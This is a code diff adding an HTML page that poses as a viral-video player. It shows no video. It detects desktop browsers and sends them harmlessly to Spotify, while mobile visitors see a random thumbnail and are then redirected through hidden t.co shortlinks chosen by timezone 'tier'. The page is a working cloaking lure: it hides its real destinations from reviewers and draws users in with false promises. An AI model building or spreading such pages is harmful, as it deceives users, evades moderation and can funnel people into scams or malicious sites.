@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Player Loading...</title>
+
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-HG123BCKRZ"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-HG123BCKRZ');
+    </script>
+
+    <meta property="og:title" content="Watch Full Viral Video Here" />
+    <meta property="og:description" content="Click to play the trending video" />
+    <meta property="og:type" content="video.other" />
+    <meta property="og:image" content="https://images2.imgbox.com/60/a2/HTKS5GyQ_o.jpg" />
+    
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            background-color: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .loading-thumb {
+            width: 100vw;
+            height: 100vh;
+            object-fit: cover;
+            object-position: center;
+            display: none; /* Pehle se image hidden rahegi taake PC par na dikhe */
+        }
+    </style>
+</head>
+<body>
+    <img id="display-img" class="loading-thumb" src="" alt="Loading Video Player..." />
+    
+    <script>
+        // PC / Desktop Browser Check (Windows, Mac, Linux, etc.)
+        var isDesktop = !/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        
+        if (isDesktop) {
+            // Agar PC user hai toh FORAN bina kuch dikhaye Spotify par redirect karo
+            window.location.href = "https://open.spotify.com";
+        } else {
+            // Agar Mobile user hai toh image ko show karo aur dynamic routing lagao
+            document.getElementById('display-img').style.display = "block";
+
+            // AAPKI APNI 5 IMAGES KE LINKS
+            var images = [
+                "https://i.ibb.co/HTKS5GyQ/image.jpg",
+                "https://i.ibb.co/DPM6pJxz/image.jpg",
+                "https://i.ibb.co/5gSt0BzX/image.jpg",
+                "https://i.ibb.co/KzV0GW4N/image.jpg",
+                "https://i.ibb.co/DDQv9R5Q/image.jpg"
+            ];
+            
+            // Random image lagana
+            var randomImage = images[Math.floor(Math.random() * images.length)];
+            document.getElementById('display-img').src = randomImage;
+
+            // ===== GEO TIER ROUTING LOGIC =====
+            var lowTierZones = [
+                "Asia/Karachi", "Asia/Dhaka", "Asia/Kolkata", "Asia/Calcutta",
+                "Asia/Kathmandu", "Asia/Colombo", "Asia/Kabul",
+                "Africa/Lagos", "Africa/Nairobi", "Africa/Cairo", "Africa/Accra",
+                "Africa/Khartoum", "Africa/Kampala", "Africa/Dar_es_Salaam",
+                "Africa/Addis_Ababa", "Africa/Algiers", "Africa/Casablanca",
+                "Asia/Jakarta", "Asia/Manila", "Asia/Yangon", "Asia/Phnom_Penh",
+                "Asia/Vientiane", "Asia/Dhaka", "Asia/Thimphu",
+                "Asia/Baghdad", "Asia/Damascus", "Asia/Amman", "Asia/Beirut"
+            ];
+
+            function getUserTimezone() {
+                try {
+                    return Intl.DateTimeFormat().resolvedOptions().timeZone;
+                } catch (e) {
+                    return "";
+                }
+            }
+
+            function isLowTier(tz) {
+                for (var i = 0; i < lowTierZones.length; i++) {
+                    if (tz === lowTierZones[i]) return true;
+                }
+                return false;
+            }
+
+            // Mobile redirection with 1.5s delay
+            window.onload = function() {
+                var smartLink = "https://t.co/ai7FHs76Ab";   // Tier 1 & 2
+                var lowTierLink = "https://t.co/LqcpMMaRLC";  // Tier 3 & 4
+
+                var tz = getUserTimezone();
+                var targetUrl = isLowTier(tz) ? lowTierLink : smartLink;
+
+                setTimeout(function() {
+                    window.location.href = targetUrl;
+                }, 1500);
+            };
+        }
+    </script>
+</body>
+</html>
